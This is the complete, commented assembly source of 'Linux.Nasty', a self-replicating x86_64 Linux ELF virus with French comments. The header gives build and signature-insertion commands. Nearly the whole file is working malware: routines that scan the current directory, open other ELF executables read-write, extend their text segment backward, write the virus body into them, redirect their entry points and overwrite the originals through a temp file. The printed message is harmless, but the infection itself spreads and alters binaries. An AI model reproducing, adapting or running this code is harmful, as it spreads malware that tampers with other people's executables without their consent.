; Linux.Nasty
; Ecrit par TMZ (2021)
; Traduit en français par @MorpheusH3x de la @ret2school (06/2021)
;
; Ce virus doit être assemblé avec FASM x64 (testé avec la version 1.73.27 sur Linux 5.11.14-gentoo).
;     - s'appuie sur la technique d'infection par segment de texte inversé où le segment est étendu en sens inverse par PAGE_SIZE pour faire de la place au virus.
;     - cette technique ne fonctionne que sur les exécutables ELF ordinaires (ne fonctionne pas avec PIE).
;     - elle ne fonctionne pas non plus sur les systèmes où les pages énormes sont activées pour l'instant.
;     - l'alignement de PAGE_SIZE devrait être calculé dynamiquement mais ce code suppose sa valeur de 4096 pour les besoins de la démonstration.
;     - infecte le répertoire courant (de manière non récursive).
;     - le point d'entrée se trouve toujours dans le segment .text, ce qui est moins suspect.
;
; Assembler et insérer la signature du virus dans le binaire de la première génération avec :
;       $ fasm Linux.Nasty.asm
;       $ echo -n 544d5a00 | xxd -r -p -s +0x9 - Linux.Nasty   
;
; Le payload (non destructive) est juste un message affiché sur stdout.
;
; Un grand merci à ceux qui font vivre la scène VX !
; N'hésitez pas à m'envoyer un e-mail: tmz@null.net || tmz@syscall.sh || thomazi@linux.com
; @guitmz || @TMZvx
; https://www.guitmz.com
; https://syscall.sh
;
; À utiliser à vos risques et périls.
;
; Références :
; https://web.archive.org/web/20210420163849/https://ivanlef0u.fr/repo/madchat/vxdevl/vdat/tuunix01.htm
; https://github.com/elfmaster/skeksi_virus
; https://github.com/NickStephens/elfit
; 
; Mémoire tampon de la pile:
; r13       = descripteur du fichier temporaire cible
; r14       = adresse mmap cible
; r15       = STAT
; r15 + 150 = jmp patché vers OEP
; r15 + 200 = DIRENT.d_name
; r15 + 500 = taille du répertoire
; r15 + 600 = DIRENT


format ELF64 executable 3

SYS_EXIT        = 0x3c
SYS_OPEN        = 0x2
SYS_CLOSE       = 0x3
SYS_WRITE       = 0x1
SYS_READ        = 0x0
SYS_GETDENTS64  = 0xd9
SYS_FSTAT       = 0x5
SYS_CREAT       = 0x55
SYS_LSEEK       = 0x8
SYS_MMAP        = 0x9
SYS_MUNMAP      = 0xb
SYS_SYNC        = 0xa2
SYS_RENAME      = 0x52
EHDR_SIZE       = 0x40
ELFCLASS64      = 0x2
EM_X86_64       = 0x3e
O_RDONLY        = 0x0
O_RDWR          = 0x2
STDOUT          = 0x1
SEEK_CUR        = 0x1
DIRENT_BUFSIZE  = 0x400
PAGE_SIZE       = 0x1000
MAP_PRIVATE     = 0x2

PROT_READ       = 0x1
PROT_WRITE      = 0x2
DT_REG          = 0x8
PT_LOAD         = 0x1
PF_X            = 0x1
PF_R            = 0x4

PAGE_SIZE   equ PAGE_SIZE
V_SIZE      equ v_stop - v_start

struc DIRENT {
    .d_ino          rq 1
    .d_off          rq 1
    .d_reclen       rw 1
    .d_type         rb 1
    label .d_name   byte
}
virtual at 0
  DIRENT DIRENT
  sizeof.DIRENT = $ - DIRENT
end virtual

struc STAT {
    .st_dev         rq 1
    .st_ino         rq 1
    .st_nlink       rq 1
    .st_mode        rd 1
    .st_uid         rd 1
    .st_gid         rd 1
    .pad0           rb 4
    .st_rdev        rq 1
    .st_size        rq 1
    .st_blksize     rq 1
    .st_blocks      rq 1
    .st_atime       rq 1
    .st_atime_nsec  rq 1
    .st_mtime       rq 1
    .st_mtime_nsec  rq 1
    .st_ctime       rq 1
    .st_ctime_nsec  rq 1
}
virtual at 0
  STAT STAT
  sizeof.STAT = $ - STAT
end virtual

struc EHDR {
    .magic      rd  1
    .class      rb  1
    .data       rb  1
    .elfversion rb  1
    .os         rb  1
    .abiversion rb  1
    .pad        rb  7
    .type       rb  2
    .machine    rb  2
    .version    rb  4
    .entry      rq  1
    .phoff      rq  1
    .shoff      rq  1
    .flags      rb  4
    .ehsize     rb  2
    .phentsize  rb  2
    .phnum      rb  2
    .shentsize  rb  2
    .shnum      rb  2
    .shstrndx   rb  2
}
virtual at 0
  EHDR EHDR
  sizeof.EHDR = $ - EHDR
end virtual

struc PHDR {
    .type   rb  4
    .flags  rd  1
    .offset rq  1
    .vaddr  rq  1
    .paddr  rq  1
    .filesz rq  1
    .memsz  rq  1
    .align  rq  1
}
virtual at 0
  PHDR PHDR
  sizeof.PHDR = $ - PHDR
end virtual

struc SHDR {
    .name       rb  4
    .type       rb  4
    .flags      rq  1
    .addr       rq  1
    .offset     rq  1
    .size       rq  1
    .link       rb  4
    .info       rb  4
    .addralign  rq  1
    .entsize    rq  1
    .hdr_size = $ - .name
}
virtual at 0
  SHDR SHDR
  sizeof.SHDR = $ - PHDR
end virtual

segment readable executable
entry v_start

v_start:
    sub rsp, 2000                                               ; réservation de 2000 octets
    mov r15, rsp                                                ; r15 a l'adresse réservée du tampon de la pile

    load_dir:
        push "."                                                ; pousse "." dans la pile (rsp)
        mov rdi, rsp                                            ; mise de "." dans rdi
        mov rsi, O_RDONLY
        xor rdx, rdx                                            ; n'utilisant aucun drapeau
        mov rax, SYS_OPEN
        syscall                                                 ; rax contient le fd (descripteur de fichier)

        mov r8, rax                                             ; mise de fd dans r8 temporairement

        mov rdi, rax                                            ; mise de fd dans rdi
        lea rsi, [r15 + 600 + DIRENT]                           ; rsi = dirent dans la pile
        mov rdx, DIRENT_BUFSIZE                                 ; tampon avec la taille maximale du répertoire
        mov rax, SYS_GETDENTS64
        syscall    
        
        mov r9, rax                                             ; r9 contient maintenant les entrées du répertoire

        mov rdi, r8                                             ; charger le répertoire ouvert fd depuis r8
        mov rax, SYS_CLOSE                                      ; fermer le fd source dans rdi
        syscall

        test r9, r9                                             ; vérifie que la liste des répertoires a réussi
        js cleanup                                              ; si un code négatif est renvoyé, j'ai échoué et je dois quitter le système

        mov qword [r15 + 500], r9                               ; [r15 + 500] contient maintenant la taille du répertoire
        xor rcx, rcx                                            ; sera la position dans les entrées du répertoire

   file_loop:
        push rcx                                                ; préserver rcx (important, utilisé comme compteur pour la longueur de l'enregistrement dirent)
        cmp [rcx + r15 + 600 + DIRENT.d_type], DT_REG           ; vérifier si c'est un fichier régulier, dirent.d_type
        jne .continue                                           ; si non, passez au fichier suivant

        .open_target:
            push rcx
            lea rdi, [rcx + r15 + 600 + DIRENT.d_name]          ; dirent.d_name à partir de la pile
            mov rsi, O_RDWR                                     ; ouvrir la cible en mode lecture-écriture
            xor rdx, rdx                                        ; n'utiliser aucun drapeau
            mov rax, SYS_OPEN
            syscall

            test rax, rax                                       ; si le fichier ne peut être ouvert, essayez le suivant
            js .continue                                        ; cela empêche également l'auto-infection puisque vous ne pouvez pas ouvrir un fichier en cours d'exécution en mode écriture (ce qui se produira lors de la première exécution)
            
            mov r8, rax                                         ; charger rax dans r8 qui contient le fd source
            xor rax, rax                                        ; nettoyer rax, sera utilisé pour copier le nom de fichier de l'hôte dans le tampon de la pile

            pop rcx
            lea rsi, [rcx + r15 + 600 + DIRENT.d_name]          ; mettre l'adresse dans l'index de la source
            lea rdi, [r15 + 200]                                ; mettre l'adresse dans l'index de destination (qui est dans le tampon de la pile en [r15 + 200])

            .copy_host_name:
                mov al, [rsi]                                   ; copier l'octet à l'adresse dans rsi vers al
                inc rsi                                         ; incrémenter l'adresse en rsi
                mov [rdi], al                                   ; copier l'octet dans al à l'adresse de rdi
                inc rdi                                         ; incrémenter l'adresse en rdi
                cmp al, 0                                       ; regarde si c'est un zéro ascii
                jne .copy_host_name                             ; sauter en arrière et lire l'octet suivant si non
            
        .map_target:
            mov rdi, r8                                         ; charger le fd source vers rdi
            lea rsi, [r15 + STAT]                               ; charger la structure fstat dans rsi
            mov rax, SYS_FSTAT
            syscall                                             ; La structure fstat dans la pile contient des informations sur le fichier cible

            xor rdi, rdi                                        ; le système d'exploitation choisira la destination du mapping
            mov rsi, [r15 + STAT.st_size]                       ; charger rsi avec la taille du fichier de fstat.st_size dans la pile
            mov rdx, PROT_READ or PROT_WRITE                    ; protéger RW = PROT_READ (0x01) | PROT_WRITE (0x02)
            mov r10, MAP_PRIVATE                                ; les pages seront privées
            xor r9, r9                                          ; décalage dans le fichier source (zéro signifie le début du fichier source)
            mov rax, SYS_MMAP                                   
            syscall                                             ; maintenant rax pointera vers l'emplacement mappé

            push rax                                            ; pousse l'adresse de mmap dans la pile
            mov rdi, r8                                         ; rdi est maintenant le fd cible
            mov rax, SYS_CLOSE                                  ; fermer le fd cibledans rdi
            syscall
            pop rax                                             ; restaurer l'adresse mmap de la pile

            test rax, rax                                       ; tester si mmap a réussi
            js .continue                                        ; sauter le fichier si ce n'est pas

        .is_elf:
            cmp [rax + EHDR.magic], 0x464c457f                  ; 0x464c457f signifie .ELF (dword, little-endian)
            jnz .continue                                       ; n'est pas un binaire ELF, fermer et passer au fichier suivant s'il y en a un.
        
        .is_64:
            cmp [rax + EHDR.class], ELFCLASS64                  ; vérifier si l'ELF cible est 64bit
            jne .continue                                       ; si ce n'est pas le cas, ignorez-le
            cmp [rax + EHDR.machine], EM_X86_64                 ; vérifier si l'ELF cible est une architecture x86_64
            jne .continue                                       ; si ce n'est pas le cas, ignorez-le

        .is_infected:
            cmp dword [rax + EHDR.pad], 0x005a4d54              ; vérifier la signature dans ehdr.pad (TMZ en little-endian, plus le zéro pour remplir la taille d'un word, 2 octets)
            jz .continue                                        ; déjà infecté, fermer et passer au fichier suivant s'il y en a un.

        .infection_candidate:
            call infect                                         ; appelle la routine d'infection

    .continue:
        pop rcx                                                 ; restaurer rcx, utilisé comme compteur pour la longueur du répertoire
        add cx, [rcx + r15 + 600 + DIRENT.d_reclen]             ; ajout de la longueur de l'enregistrement du répertoire à cx (rcx inférieur, pour les word)
        cmp rcx, qword [r15 + 500]                              ; comparaison du compteur rcx avec la taille totale des enregistrements du répertoire
        jne file_loop                                           ; si le compteur n'est pas le même, continuer la boucle

    call payload                                                ; en appelant le payload, nous fixons l'adresse du label du message sur la pile
    msg:
        db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x20, 0x62, 0x79, 0x20, 0x54, 0x4d, 0x5a, 0x20, 0x28, 0x63, 0x29, 0x20, 0x32, 0x30, 0x32, 0x31, 0x0a, 0x0a
        db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a
        db 0x54, 0x72, 0x69, 0x70, 0x6c, 0x65, 0x20, 0x58, 0x20, 0x72, 0x61, 0x74, 0x65, 0x64, 0x0a
        db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a
        db 0x4a, 0x75, 0x73, 0x74, 0x69, 0x63, 0x65, 0x2c, 0x20, 0x61, 0x20, 0x77, 0x61, 0x73, 0x74, 0x65, 0x2d, 0x70, 0x69, 0x74, 0x0a
        db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a
        db 0x44, 0x65, 0x65, 0x70, 0x65, 0x72, 0x20, 0x69, 0x6e, 0x20, 0x74, 0x68, 0x65, 0x20, 0x64, 0x69, 0x72, 0x74, 0x0a
        db 0x4e, 0x61, 0x73, 0x74, 0x79, 0x2c, 0x20, 0x6e, 0x61, 0x73, 0x74, 0x79, 0x0a
        db 0x4d, 0x61, 0x6b, 0x69, 0x6e, 0x67, 0x20, 0x62, 0x6f, 0x64, 0x69, 0x65, 0x73, 0x20, 0x68, 0x75, 0x72, 0x74, 0x0a, 0x0a
        len = $-msg

    payload:
        pop rsi                                                 ; charger l'adresse du message de la pile dans le rsi
        mov rax, SYS_WRITE
        mov rdi, STDOUT                                         ; afficher le paylaod
        mov rdx, len
        syscall

        jmp cleanup                                             ; termine l'exécution

infect:
    push rbp                                                    ; sauvegarder la stack frame de l'appelant
    mov rbp, rsp                                                ; sauvegarder le pointeur de la pile

    mov r14, rax                                                ; r14 = pointeur vers les octets cibles (adresse de la memory map)
    mov r9, [r14 + EHDR.phoff]                                  ; mettre r9 à l'offset des PHDRs
    mov r12, [r14 + EHDR.shoff]                                 ; mettre r12 à l'offset des SHDRs

    xor rbx, rbx                                                ; initialisation du compteur de boucle phdr dans rbx
    xor rcx, rcx                                                ; initialisation du compteur de boucle shdr dans rdx

    .loop_phdr:
        cmp [r14 + r9 + PHDR.type], PT_LOAD                     ; vérifier si phdr.type est PT_LOAD
        jnz .not_txt_segment                                    ; si ce n'est pas le cas, corrigez-le si nécessaire

        cmp [r14 + r9 + PHDR.flags], PF_R or PF_X               ; vérifier si PT_LOAD est un segment de texte
        jnz .not_txt_segment                                    ; si ce n'est pas le cas, corrigez-le si nécessaire

        .txt_segment:
            sub [r14 + r9 + PHDR.vaddr], 2 * PAGE_SIZE          ; diminuer p_vaddr de 2 fois PAGE_SIZE
            add [r14 + r9 + PHDR.filesz], 2 * PAGE_SIZE         ; augmenter p_filesz de 2 fois PAGE_SIZE
            add [r14 + r9 + PHDR.memsz], 2 * PAGE_SIZE          ; augmenter p_memsz de 2 fois PAGE_SIZE
            sub [r14 + r9 + PHDR.offset], PAGE_SIZE             ; diminuer p_offset de PAGE_SIZE
            mov r8, [r14 + r9 + PHDR.vaddr]                     ; contient le segment .text du vaddr patché, qui sera utilisé pour patcher le point d'entrée.

            jmp .next_phdr                                      ; passer au phdr suivant

        .not_txt_segment:
            add [r14 + r9 + PHDR.offset], PAGE_SIZE             ; correction de p_offset des phdrs qui ne sont pas le segment .text (augmentation par PAGE_SIZE)

    .next_phdr:
        inc bx                                                  ; augmenter le compteur de phdr, bx
        cmp bx, word [r14 + EHDR.phnum]                         ; vérifier si nous avons déjà parcouru tous les phdrs
        jge .loop_shdr                                          ; sortir de la boucle si oui

        add r9w, word [r14 + EHDR.phentsize]                    ; sinon, ajouter le ehdr.phentsize actuel dans r9w
        jnz .loop_phdr                                          ; lire le prochain phdr

    .loop_shdr:
        add [r14 + r12 + SHDR.offset], PAGE_SIZE                ; augmenter shdr.offset de PAGE_SIZE
    
    .next_shdr:
        inc cx                                                  ; augmenter le compteur shdr, cx
        cmp cx, word [r14 + EHDR.shnum]                         ; vérifie si nous avons déjà bouclé tous les shdrs
        jge .create_temp_file                                   ; sortir de la boucle si oui
        
        add r12w, word [r14 + EHDR.shentsize]                   ; sinon, ajouter le ehdr.shentsize actuel dans r12
        jnz .loop_shdr                                          ; lire le prochain shdr
    
    .create_temp_file:
        push 0
        mov rax, 0x706d742e79746e2e                             ; Pousser ".nty.tmp\0" sur la pile
        push rax                                                ; ce sera le nom du fichier temporaire, pas génial mais c'est pour la démonstration seulement

        mov rdi, rsp
        mov rsi, 755o                                           ; -rw-r--r--
        mov rax, SYS_CREAT                                      ; création d'un fichier temporaire
        syscall
        
        test rax, rax                                           ; vérifier si la création du fichier temporaire a fonctionné
        js .infect_fail                                         ; si un code négatif est renvoyé, j'ai échoué et je dois quitter le système

        mov r13, rax                                            ; r13 contient maintenant le fichier temporaire fd

    .patch_ehdr:
        mov r10, [r14 + EHDR.entry]                             ; déplacer l'OEP de l'hôte vers r10

        add [r14 + EHDR.phoff], PAGE_SIZE                       ; ncrémenter ehdr->phoff de PAGE_SIZE
        add [r14 + EHDR.shoff], PAGE_SIZE                       ; incrémenter ehdr->shoff de PAGE_SIZE
        mov dword [r14 + EHDR.pad], 0x005a4d54                  ; ajouter la signature dans ehdr.pad (TMZ en little-endian, plus le zéro pour remplir la taille d'un word, 2 octets)

        add r8, EHDR_SIZE                                       ; ajouter la taille de l'EHDR à r8 (vaddr du segment .text patché)
        mov [r14 + EHDR.entry], r8                              ; mettre le nouveau point d'entrée à la valeur contenu dans r8

        mov rdi, r13                                            ; fd cible à partir  r13
        mov rsi, r14                                            ; mmap *buff à partir de r14
        mov rdx, EHDR_SIZE                                      ; taille de l'ehdr
        mov rax, SYS_WRITE                                      ; écrire l'ehdr corrigé sur l'hôte cible
        syscall

        cmp rax, 0
        jbe .infect_fail

    .write_virus_body:
        call .delta                                             ; l'éternel tour de passe-passe
        .delta:
            pop rax
            sub rax, .delta

        mov rdi, r13                                            ; fd temporaire cible de r13
        lea rsi, [rax + v_start]                                ; charger *v_start
        mov rdx, V_SIZE                                         ; taille du corps du virus
        mov rax, SYS_WRITE
        syscall

        cmp rax, 0
        jbe .infect_fail

    .write_patched_jmp:
        mov byte [r15 + 150], 0x68                              ; 68 xx xx xx xx c3 (C'est l'opcode pour "push addr" et "ret".)
        mov dword [r15 + 151], r10d                             ; sur le tampon de pile, préparez l'instruction jmp au point d'entrée de l'hôte
        mov byte [r15 + 155], 0xc3                              ; C'est la dernière chose à exécuter après l'exécution du virus, avant que l'hôte ne prenne le contrôle.

        mov rdi, r13                                            ; r9 contient le fd
        lea rsi, [r15 + 150]                                    ; rsi = patché push/ret dans le tampon de pile = [r15 + 150]
        mov rdx, 6                                              ; taille du push/ret
        mov rax, SYS_WRITE
        syscall
        
    .write_everything_else:
        mov rdi, r13                                            ; récupérer le fd temporaire de r13
        mov rsi, PAGE_SIZE                                      
        sub rsi, V_SIZE + 6                                     ; rsi = PAGE_SIZE + sizeof(push/ret)
        mov rdx, SEEK_CUR                                       
        mov rax, SYS_LSEEK                                      ; déplace le pointeur fd à la position juste après PAGE_SIZE + 6 octets
        syscall

        mov rdi, r13
        lea rsi, [r14 + EHDR_SIZE]                              ; démarrage après l'ehdr sur l'hôte cible
        mov rdx, [r15 + STAT.st_size]                           ; récupérer la taille du fichier hôte à partir de la pile
        sub rdx, EHDR_SIZE                                      ; soustraire la taille de l'EHDR de celle-ci (puisque nous avons déjà écrit un EHDR)
        mov rax, SYS_WRITE                                      ; écrire le reste du fichier hôte dans un fichier temporaire
        syscall
 
        mov rax, SYS_SYNC                                       ; enregistrement des caches du système de fichiers sur le disque
        syscall

    .end:
        mov rdi, r14                                            ; récupère l'adresse mmap de r14 vers rdi
        mov rsi, [r15 + STAT.st_size]                           ; récupère la taille du fichier hôte à partir du tampon de la pile
        mov rax, SYS_MUNMAP                                     ; Déblocage de la mémoire tampon
        syscall

        mov rdi, r13                                            ; rdi est maintenant un fichier temporaire fd
        mov rax, SYS_CLOSE                                      ; fermer le fichier temporaire fd
        syscall

        push 0
        mov rax, 0x706d742e79746e2e                             ; Pousser ".nty.tmp\0" sur la pile
        push rax                                                ; comme vous le savez maintenant, cela aurait dû être fait d'une bien meilleure manière :) 

        mov rdi, rsp                                            ; récupérer le nom du fichier temporaire de la pile dans rdi
        lea rsi, [r15 + 200]                                    ; définit rsi à l'adresse du nom de fichier de l'hôte à partir du tampon de la pile
        mov rax, SYS_RENAME                                     ; remplacer le fichier hôte par le fichier temporaire (un peu comme "mv tmp_file host_file")
        syscall

        mov rax, 0                                              ; l'infection semble avoir fonctionné, mettre rax à zéro comme marqueur
        mov rsp, rbp                                            ; restaurer le pointeur de pile
        pop rbp                                                 ; restaurer la stack frame de l'appelant
        jmp .infect_ret                                         ; retourne avec succès
        
    .infect_fail:
        mov rax, 1                                              ; infection falsifiée, mettre rax à 1 comme marqueur
    .infect_ret:                                                
        ret

cleanup:
    add rsp, 2000                                               ; restauration de la pile pour que le processus hôte puisse fonctionner normalement, cela pourrait également être amélioré
    xor rdx, rdx                                                ; effacement de rdx avant de donner le contrôle à l'hôte (rdx est un pointeur de fonction que l'application doit enregistrer avec atexit - d'après l'ABI x64)

v_stop:
    xor rdi, rdi                                                ; code de sortie 0
    mov rax, SYS_EXIT 
    syscall
